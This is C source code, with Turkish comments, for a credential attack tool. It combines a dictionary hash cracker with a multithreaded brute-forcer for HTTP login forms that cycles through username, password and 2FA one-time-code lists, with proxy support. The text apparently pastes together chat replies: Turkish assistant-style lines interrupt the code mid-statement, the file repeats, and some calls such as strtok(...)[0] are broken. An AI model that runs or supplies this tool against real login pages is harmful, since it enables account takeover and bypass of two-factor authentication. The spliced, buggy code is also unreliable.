#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <curl/curl.h>
#include <openssl/md5.h>
#include <openssl/sha.h>
#include <openssl/sha512.h>

#define MAX_WORD_LEN 256
#define MAX_URL_LEN 1024
#define MAX_MSG_LEN 1024
#define BUFFER_SIZE 2048

typedef enum {
    HASH_MD5,
    HASH_SHA1,
    HASH_SHA256,
    HASH_SHA512,
    HASH_UNKNOWN
} hash_type_t;

typedef struct {
    char *target_ip;
    char *username_list;
    char *password_list;
    char *attack_type;
    char *form_info;
    char *error_message;
    char *hash;
    hash_type_t hash_type;
    int thread_id;
    int num_threads;
    int verbose;
    char *method; // HTTP metodunu belirtir
    char *form_fields; // Form alanları
    char *otp_codes_file; // 2FA kodlarının bulunduğu dosya
    char *proxy; // Proxy ayarı
    char *proxychains_conf; // Proxychains yapılandırması
    int timeout; // İstek zaman aşımı
} thread_data_t;

void hash_md5(const char *input, char *output) {
    unsigned char digest[MD5_DIGEST_LENGTH];
    MD5((unsigned char *)input, strlen(input), digest);
    for (int i = 0; i < MD5_DIGEST_LENGTH; i++) {
        sprintf(&output[i * 2], "%02x", digest[i]);
    }
}

void hash_sha1(const char *input, char *output) {
    unsigned char digest[SHA_DIGEST_LENGTH];
    SHA1((unsigned char *)input, strlen(input), digest);
    for (int i = 0; i < SHA_DIGEST_LENGTH; i++) {
        sprintf(&output[i * 2], "%02x", digest[i]);
    }
}

void hash_sha256(const char *input, char *output) {
    unsigned char digest[SHA256_DIGEST_LENGTH];
    SHA256((unsigned char *)input, strlen(input), digest);
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        sprintf(&output[i * 2], "%02x", digest[i]);
    }
}

void hash_sha512(const char *input, char *output) {
    unsigned char digest[SHA512_DIGEST_LENGTH];
    SHA512((unsigned char *)input, strlen(input), digest);
    for (int i = 0; i < SHA512_DIGEST_LENGTH; i++) {
        sprintf(&output[i * 2], "%02x", digest[i]);
    }
}

void *hash_crack(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    FILE *pass_file = fopen(data->password_list, "r");
    if (!pass_file) {
        perror("Parola dosyası açılamadı");
        return NULL;
    }

    char password[MAX_WORD_LEN];
    char hashed_password[MAX_WORD_LEN];
    char computed_hash[MAX_WORD_LEN];

    while (fscanf(pass_file, "%s", password) != EOF) {
        switch (data->hash_type) {
            case HASH_MD5:
                hash_md5(password, computed_hash);
                break;
            case HASH_SHA1:
                hash_sha1(password, computed_hash);
                break;
            case HASH_SHA256:
                hash_sha256(password, computed_hash);
                break;
            case HASH_SHA512:
                hash_sha512(password, computed_hash);
                break;
            default:
                fprintf(stderr, "Bilinmeyen hash türü\n");
                fclose(pass_file);
                return NULL;
        }

        if (strcmp(computed_hash, data->hash) == 0) {
            if (data->verbose) {
                printf("Şifre bulundu: %s\n", password);
            }
            fclose(pass_file);
            return NULL;
        }
    }

    fclose(pass_file);
    return NULL;
}

void perform_http_request(const char *url, const char *post_data, const char *error_message, const char *otp_code, thread_data_t *data) {
    CURL *curl;
    CURLcode res;
    char full_post_data[BUFFER_SIZE];

    snprintf(full_post_data, sizeof(full_post_data), "%s&otp=%s", post_data, otp_code);

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, full_post_data);

        if (data->proxy) {
            curl_easy_setopt(curl, CURLOPT_PROXY, data->proxy);
        }

        if (data->proxychains_conf) {
            // Proxychains yapılandırması
        }

        curl_easy_setopt(curl, CURLOPT_TIMEOUT, data->timeout);

        if (data->verbose) {
            curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
        }

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            fprintf(stderr, "cURL hatası: %s\n", curl_easy_strerror(res));
        }

        curl_easy_cleanup(curl);
    }
}

void *http_form_attack(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    FILE *user_file = fopen(data->username_list, "r");
    FILE *pass_file = fopen(data->password_list, "r");
    FILE *otp_file = data->otp_codes_file ? fopen(data->otp_codes_file, "r") : NULL;

    if (!user_file || !pass_file) {
        perror("Kullanıcı veya parola dosyası açılamadı");
        if (user_file) fclose(user_file);
        if (pass_file) fclose(pass_file);
        return NULL;
    }

    CURL *curl;
    CURLcode res;
    char post_data[1024];
    char username[MAX_WORD_LEN];
    char password[MAX_WORD_LEN];
    char otp_code[MAX_WORD_LEN];
    char url[MAX_URL_LEN];

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (!curl) {
        perror("cURL başlatılamadı");
        fclose(user_file);
        fclose(pass_file);
        if (otp_file) fclose(otp_file);
        return NULL;
    }

    while (fscanf(user_file, "%s", username) != EOF) {
        while (fscanf(pass_file, "%s", password) != EOF) {
            if (data->thread_id != (ftell(user_file) % data->num_threads)) {
                continue;
            }

            snprintf(url, sizeof(url), "http://%s%s", data->target_ip, data->form_info);
            snprintf(post_data, sizeof(post_data), "%s=%s&%s=%s&%s", 
                     strtok(data->form_fields, "&")[0], username, 
                     strtok(NULL, "&")[0], password, 
                     strtok(NULL, "&")[0]);

            if (otp_file) {
                while (fgets(otp_code, sizeof(otp_code), otp_file)) {
                    otp_code[strcspn(otp_code, "\n")] = '\0';
                    perform_http_request(url, post_data, data->error_message, otp_code, data);
                }
                rewind(otp_file);
            } else {
                perform_http_request(url, post_data, data->error_message, "", data);
            }

            fseek(pass_file, 0, SEEK_SET);
        }
    }

    fclose(user_file);
    fclose(pass_file);
    if (otp_file) fclose(otp_file);
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 6) {
        fprintf(stderr, "Kullanım: %s <hedef_ip> -l <kullanıcı_listesi> -p <parola_listesi> <saldırı_türü> \"[sayfa_yolu]:[form_alanları]:F=[hata_mesajı]\" [-v] [-h <hash> -t <hash_türü>] [-m <method>] [-f <form_alanları>] [-o <otp_dosya>] [-t <iş_parçacığı_sayısı>] [-x <proxy>] [-y <proxychains_conf>] [-z <timeout>]\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    char *username_list = NULL;
    char *password_list = NULL;
    char *attack_type = NULL;
    char *form_info = NULL;
    char *error_message = NULL;
    char *hash = NULL;
    hash_type_t hash_type = HASH_UNKNOWN;
    int verbose = 0;
    char *method = NULL;
    char *form_fields = NULL;
    char *otp_codes_file = NULL;
    char *proxy = NULL;
    char *proxychains_conf = NULL;
    int timeout = 30;

    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-l") == 0 && i + 1 < argc) {
            username_list = argv[++i];
        } else if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            password_list = argv[++i];
        } else if (strcmp(argv[i], "http-get-form") == 0 || strcmp(argv[i], "http-post-form") == 0) {
            attack_type = argv[i];
           İşte güncellenmiş kodun tamamı, 2FA desteği dahil:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <curl/curl.h>
#include <openssl/md5.h>
#include <openssl/sha.h>
#include <openssl/sha512.h>

#define MAX_WORD_LEN 256
#define MAX_URL_LEN 1024
#define MAX_MSG_LEN 1024
#define BUFFER_SIZE 2048

typedef enum {
    HASH_MD5,
    HASH_SHA1,
    HASH_SHA256,
    HASH_SHA512,
    HASH_UNKNOWN
} hash_type_t;

typedef struct {
    char *target_ip;
    char *username_list;
    char *password_list;
    char *attack_type;
    char *form_info;
    char *error_message;
    char *hash;
    hash_type_t hash_type;
    int thread_id;
    int num_threads;
    int verbose;
    char *method; // HTTP metodunu belirtir
    char *form_fields; // Form alanları
    char *otp_codes_file; // 2FA kodlarının bulunduğu dosya
    char *proxy; // Proxy ayarı
    char *proxychains_conf; // Proxychains yapılandırması
    int timeout; // İstek zaman aşımı
} thread_data_t;

void hash_md5(const char *input, char *output) {
    unsigned char digest[MD5_DIGEST_LENGTH];
    MD5((unsigned char *)input, strlen(input), digest);
    for (int i = 0; i < MD5_DIGEST_LENGTH; i++) {
        sprintf(&output[i * 2], "%02x", digest[i]);
    }
}

void hash_sha1(const char *input, char *output) {
    unsigned char digest[SHA_DIGEST_LENGTH];
    SHA1((unsigned char *)input, strlen(input), digest);
    for (int i = 0; i < SHA_DIGEST_LENGTH; i++) {
        sprintf(&output[i * 2], "%02x", digest[i]);
    }
}

void hash_sha256(const char *input, char *output) {
    unsigned char digest[SHA256_DIGEST_LENGTH];
    SHA256((unsigned char *)input, strlen(input), digest);
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        sprintf(&output[i * 2], "%02x", digest[i]);
    }
}

void hash_sha512(const char *input, char *output) {
    unsigned char digest[SHA512_DIGEST_LENGTH];
    SHA512((unsigned char *)input, strlen(input), digest);
    for (int i = 0; i < SHA512_DIGEST_LENGTH; i++) {
        sprintf(&output[i * 2], "%02x", digest[i]);
    }
}

void *hash_crack(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    FILE *pass_file = fopen(data->password_list, "r");
    if (!pass_file) {
        perror("Parola dosyası açılamadı");
        return NULL;
    }

    char password[MAX_WORD_LEN];
    char hashed_password[MAX_WORD_LEN];
    char computed_hash[MAX_WORD_LEN];

    while (fscanf(pass_file, "%s", password) != EOF) {
        switch (data->hash_type) {
            case HASH_MD5:
                hash_md5(password, computed_hash);
                break;
            case HASH_SHA1:
                hash_sha1(password, computed_hash);
                break;
            case HASH_SHA256:
                hash_sha256(password, computed_hash);
                break;
            case HASH_SHA512:
                hash_sha512(password, computed_hash);
                break;
            default:
                fprintf(stderr, "Bilinmeyen hash türü\n");
                fclose(pass_file);
                return NULL;
        }

        if (strcmp(computed_hash, data->hash) == 0) {
            if (data->verbose) {
                printf("Şifre bulundu: %s\n", password);
            }
            fclose(pass_file);
            return NULL;
        }
    }

    fclose(pass_file);
    return NULL;
}

void perform_http_request(const char *url, const char *post_data, const char *error_message, const char *otp_code, thread_data_t *data) {
    CURL *curl;
    CURLcode res;
    char full_post_data[BUFFER_SIZE];

    snprintf(full_post_data, sizeof(full_post_data), "%s&otp=%s", post_data, otp_code);

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, full_post_data);

        if (data->proxy) {
            curl_easy_setopt(curl, CURLOPT_PROXY, data->proxy);
        }

        if (data->proxychains_conf) {
            // Proxychains yapılandırması
        }

        curl_easy_setopt(curl, CURLOPT_TIMEOUT, data->timeout);

        if (data->verbose) {
            curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
        }

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            fprintf(stderr, "cURL hatası: %s\n", curl_easy_strerror(res));
        }

        curl_easy_cleanup(curl);
    }
}

void *http_form_attack(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    FILE *user_file = fopen(data->username_list, "r");
    FILE *pass_file = fopen(data->password_list, "r");
    FILE *otp_file = data->otp_codes_file ? fopen(data->otp_codes_file, "r") : NULL;

    if (!user_file || !pass_file) {
        perror("Kullanıcı veya parola dosyası açılamadı");
        if (user_file) fclose(user_file);
        if (pass_file) fclose(pass_file);
        if (otp_file) fclose(otp_file);
        return NULL;
    }

    CURL *curl;
    CURLcode res;
    char post_data[1024];
    char username[MAX_WORD_LEN];
    char password[MAX_WORD_LEN];
    char otp_code[MAX_WORD_LEN];
    char url[MAX_URL_LEN];

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (!curl) {
        perror("cURL başlatılamadı");
        fclose(user_file);
        fclose(pass_file);
        if (otp_file) fclose(otp_file);
        return NULL;
    }

    while (fscanf(user_file, "%s", username) != EOF) {
        while (fscanf(pass_file, "%s", password) != EOF) {
            if (data->thread_id != (ftell(user_file) % data->num_threads)) {
                continue;
            }

            snprintf(url, sizeof(url), "http://%s%s", data->target_ip, data->form_info);
            snprintf(post_data, sizeof(post_data), "%s=%s&%s=%s&%s", 
                     strtok(data->form_fields, "&")[0], username, 
                     strtok(NULL, "&")[0], password, 
                     strtok(NULL, "&")[0]);

            if (otp_file) {
                while (fgets(otp_code, sizeof(otp_code), otp_file)) {
                    otp_code[strcspn(otp_code, "\n")] = '\0';
                    perform_http_request(url, post_data, data->error_message, otp_code, data);
                }
                rewind(otp_file);
            } else {
                perform_http_request(url, post_data, data->error_message, "", data);
            }

            fseek(pass_file, 0, SEEK_SET);
        }
    }

    fclose(user_file);
    fclose(pass_file);
    if (otp_file) fclose(otp_file);
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 6) {
        fprintf(stderr, "Kullanım: %s <hedef_ip> -l <kullanıcı_listesi> -p <parola_listesi> <saldırı_türü> \"[sayfa_yolu]:[form_alanları]:F=[hata_mesajı]\" [-v] [-h <hash> -t <hash_türü>] [-m <method>] [-f <form_alanları>] [-o <otp_dosya>] [-t <iş_parçacığı_sayısı>] [-x <proxy>] [-y <proxychains_conf>] [-z <timeout>]\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    char *username_list = NULL;
    char *password_list = NULL;
    char *attack_type = NULL;
    char *form_info = NULL;
    char *error_message = NULL;
    char *hash = NULL;
    hash_type_t hash_type = HASH_UNKNOWN;
    int verbose = 0;
    char *method = NULL;
    char *form_fields = NULL;
    char *otp_codes_file = NULL;
    char *proxy = NULL;
    char *proxychains_conf = NULL;
    int timeout = 30;

    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-l") == 0 && i + 1 < argc) {
            username_list = argv[++i];
        } else if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            password_list = argv[++i];
        } else if (strcmp(argv[i], "http-get-form") == 0 || strcmp(argv[i], "http-post-form") == 0) {
            attack_type = argv[iKodun devamı:

```c
            attack_type = argv[i];
            if (i + 1 < argc) {
                form_info = argv[++i];
                char *colon_pos = strchr(form_info, ':');
                if (colon_pos) {
                    *colon_pos = '\0';
                    error_message = colon_pos + 1;
                }
            }
        } else if (strcmp(argv[i], "-v") == 0) {
            verbose = 1;
        } else if (strcmp(argv[i], "-h") == 0 && i + 1 < argc) {
            hash = argv[++i];
        } else if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) {
            if (strcmp(argv[++i], "md5") == 0) {
                hash_type = HASH_MD5;
            } else if (strcmp(argv[i], "sha1") == 0) {
                hash_type = HASH_SHA1;
            } else if (strcmp(argv[i], "sha256") == 0) {
                hash_type = HASH_SHA256;
            } else if (strcmp(argv[i], "sha512") == 0) {
                hash_type = HASH_SHA512;
            } else {
                fprintf(stderr, "Bilinmeyen hash türü: %s\n", argv[i]);
                return 1;
            }
        } else if (strcmp(argv[i], "-m") == 0 && i + 1 < argc) {
            method = argv[++i];
        } else if (strcmp(argv[i], "-f") == 0 && i + 1 < argc) {
            form_fields = argv[++i];
        } else if (strcmp(argv[i], "-o") == 0 && i + 1 < argc) {
            otp_codes_file = argv[++i];
        } else if (strcmp(argv[i], "-x") == 0 && i + 1 < argc) {
            proxy = argv[++i];
        } else if (strcmp(argv[i], "-y") == 0 && i + 1 < argc) {
            proxychains_conf = argv[++i];
        } else if (strcmp(argv[i], "-z") == 0 && i + 1 < argc) {
            timeout = atoi(argv[++i]);
        }
    }

    if (!username_list || !password_list || !attack_type || !form_info) {
        fprintf(stderr, "Kullanım hatası: Eksik parametreler\n");
        return 1;
    }

    pthread_t *threads;
    thread_data_t *thread_data;
    int num_threads = 4;

    if (hash && hash_type != HASH_UNKNOWN) {
        threads = malloc(num_threads * sizeof(pthread_t));
        thread_data = malloc(num_threads * sizeof(thread_data_t));

        for (int i = 0; i < num_threads; i++) {
            thread_data[i].target_ip = target_ip;
            thread_data[i].username_list = username_list;
            thread_data[i].password_list = password_list;
            thread_data[i].attack_type = attack_type;
            thread_data[i].form_info = form_info;
            thread_data[i].error_message = error_message;
            thread_data[i].hash = hash;
            thread_data[i].hash_type = hash_type;
            thread_data[i].thread_id = i;
            thread_data[i].num_threads = num_threads;
            thread_data[i].verbose = verbose;
            thread_data[i].method = method;
            thread_data[i].form_fields = form_fields;
            thread_data[i].otp_codes_file = otp_codes_file;
            thread_data[i].proxy = proxy;
            thread_data[i].proxychains_conf = proxychains_conf;
            thread_data[i].timeout = timeout;

            pthread_create(&threads[i], NULL, hash_crack, (void *)&thread_data[i]);
        }

        for (int i = 0; i < num_threads; i++) {
            pthread_join(threads[i], NULL);
        }

        free(threads);
        free(thread_data);
    } else if (attack_type && (strcmp(attack_type, "http-get-form") == 0 || strcmp(attack_type, "http-post-form") == 0)) {
        threads = malloc(num_threads * sizeof(pthread_t));
        thread_data = malloc(num_threads * sizeof(thread_data_t));

        for (int i = 0; i < num_threads; i++) {
            thread_data[i].target_ip = target_ip;
            thread_data[i].username_list = username_list;
            thread_data[i].password_list = password_list;
            thread_data[i].attack_type = attack_type;
            thread_data[i].form_info = form_info;
            thread_data[i].error_message = error_message;
            thread_data[i].hash = NULL;
            thread_data[i].hash_type = HASH_UNKNOWN;
            thread_data[i].thread_id = i;
            thread_data[i].num_threads = num_threads;
            thread_data[i].verbose = verbose;
            thread_data[i].method = method;
            thread_data[i].form_fields = form_fields;
            thread_data[i].otp_codes_file = otp_codes_file;
            thread_data[i].proxy = proxy;
            thread_data[i].proxychains_conf = proxychains_conf;
            thread_data[i].timeout = timeout;

            pthread_create(&threads[i], NULL, http_form_attack, (void *)&thread_data[i]);
        }

        for (int i = 0; i < num_threads; i++) {
            pthread_join(threads[i], NULL);
        }

        free(threads);
        free(thread_data);
    } else {
        fprintf(stderr, "Kullanım hatası: Tanımlanmamış saldırı türü veya eksik parametreler\n");
        return 1;
    }

    return 0;
}
